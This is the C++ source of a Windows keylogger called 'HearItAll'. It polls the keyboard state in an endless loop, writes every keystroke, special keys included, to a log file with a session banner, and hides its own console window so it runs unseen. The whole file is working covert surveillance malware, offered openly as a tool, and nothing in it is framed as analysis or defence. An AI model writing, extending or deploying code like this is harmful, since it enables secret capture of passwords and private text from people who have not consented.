#include "HearItAll.h"

int main()
{
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);

	if (!DEBUG)
		stealth();
	char i;

	// Opens the stream
	ofstream OUTPUT_FILE;
	OUTPUT_FILE.open(LOG_PATH_NAME, ofstream::app);

	initialize(&OUTPUT_FILE);

	// Main loop
	while (true)
		for (i = 8; i <= 190; i++)
			if (GetAsyncKeyState(i) == -32767)
				saveKey(i, &OUTPUT_FILE);

	return 0;
}

// Saves a keystroke in the file
int saveKey(int key_stroke, ofstream *file)
{
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0;

	if (DEBUG)
		cout << key_stroke << endl;

	switch (key_stroke)
	{
	case 8:
		*file << "[BACKSPACE]";
		break;
	case 13:
		*file << "\n";
		break;
	case 32:
		*file << " ";
		break;
	case VK_TAB:
		*file << "[TAB]";
		break;
	case VK_SHIFT:
		*file << "[SHIFT]";
		break;
	case VK_CONTROL:
		*file << "[CONTROL]";
		break;
	case VK_ESCAPE:
		*file << "[ESCAPE]";
		break;
	case VK_END:
		*file << "[END]";
		break;
	case VK_HOME:
		*file << "[HOME]";
		break;
	case VK_LEFT:
		*file << "[LEFT]";
		break;
	case VK_UP:
		*file << "[UP]";
		break;
	case VK_RIGHT:
		*file << "[RIGHT]";
		break;
	case VK_DOWN:
		*file << "[DOWN]";
		break;
	case 190:
	case 110:
		*file << ".";
		break;
	default:
		*file << (char) key_stroke;
		break;
	}
	return 0;
}

// Stealth the console 
void stealth()
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}

// Initializes LOG.txt file with some info for the session
void initialize(ofstream *file)
{
	string dateTime = currentDateTime();
	string str;

	str += "\n\n\n";
	str += "|***********************************************************|\n";
	str += "|   _   _                       _____  _       ___   _  _   |\n";
	str += "|  | | | |                     |_   _|| |     / _ \\ | || |  |\n";
	str += "|  | |_| |  ___   __ _  _ __     | |  | |_   / /_\\ \\| || |  |\n";
	str += "|  |  _  | / _ \\ / _` || '__|    | |  | __|  |  _  || || |  |\n";
	str += "|  | | | ||  __/| (_| || |      _| |_ | |_   | | | || || |  |\n";
	str += "|  \\_| |_/ \\___| \\__,_||_|      \\___/  \\__|  \\_| |_/|_||_|  |\n";
	str += "|                                                           |\n";
	str += "|                                                           |\n";
	str += "|                      Windows version                      |\n";
	str += "|                                                           |\n";
	str += "|***********************************************************|\n";
	str += "|                                                           |\n";
	str += "| Created by: Ander Granado                                 |\n";
	str += "|                                                           |\n";
	str += "| Avaiable here: https://github.com/ander94lakx/HearItAll   |\n";
	str += "|                                                           |\n";
	str += "| Session timestamp: " + dateTime + "                    |\n";
	str += "|                                                           |\n";
	str += "|***********************************************************|\n\n";

	if (DEBUG)
		cout << str;

	*file << str;
}

const string currentDateTime()
{
	time_t rawtime;
	struct tm * timeinfo = (tm*) malloc(sizeof(tm));
	char buffer[80];

	time(&rawtime);
	localtime_s(timeinfo, &rawtime);

	strftime(buffer, 80, "%d-%m-%Y %I:%M:%S", timeinfo);
	string str(buffer);

	return str;
}